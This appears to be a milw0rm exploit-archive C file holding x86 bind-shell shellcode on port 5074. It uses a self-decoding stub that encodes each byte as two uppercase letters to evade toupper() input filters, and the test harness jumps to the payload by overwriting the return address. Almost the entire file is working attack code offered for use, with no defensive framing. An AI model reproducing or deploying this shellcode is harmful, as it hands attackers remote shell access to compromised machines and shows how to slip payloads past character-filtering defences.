/*
 * Bindshell puerto 5074 (TOUPPER EVASION)
 * 226 bytes
 * Bindshell original: Matias Sedalo (92 bytes)
 *
 * La binshell esta codificada usando 2 bytes para
 * representar 1 byte original de la siguiente forma:
 * byte original: 0xAB
 * 0x41 + 0xA = 0x4B; 0x41 + 0xB = 0x4C
 * byte codificado: [0x4B 0x4C]
 *
 * by Tora
 */

#include <stdio.h>
#include <ctype.h>

char shellcode[] =
/* _start */
"\xeb\x02"			/* jmp short A          */

/* A */
"\xeb\x05"			/* jmp short C          */

/* B */
"\xe8\xf9\xff\xff\xff"		/* call A               */

/* C */
"\x5f"				/* pop edi              */
"\x81\xef\xdf\xff\xff\xff"	/* sub edi, 0xffffffdf  */
"\x57"				/* push edi             */
"\x5e"				/* pop esi              */
"\x29\xc9"			/* sub ecx, ecx         */
"\x80\xc1\xb8"			/* add cl, 0xb8         */

/* bucle */
"\x8a\x07"			/* mov al, byte [edi]   */
"\x2c\x41"			/* sub al, 0x41         */
"\xc0\xe0\x04"			/* shl al, 4            */
"\x47"				/* inc edi              */
"\x02\x07"			/* add al, byte [edi]   */
"\x2c\x41"			/* sub al, 0x41         */
"\x88\x06"			/* mov byte [esi], al   */
"\x46"				/* inc esi              */
"\x47"				/* inc edi              */
"\x49"				/* dec ecx              */
"\xe2\xed"			/* loop bucle           */
/* Shellcode codificada de 184 (0xb8) bytes */
"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
"AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
"JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
"BLAALMNIA";

int main(void)
{
    int *ret;
    char *t;

    for (t = shellcode; *t; t++)
        if (islower(*t))
            *t = toupper(*t);

    ret=(int *)&ret +3;
    printf("Shellcode lenght=%d\n",strlen(shellcode));
    (*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-26]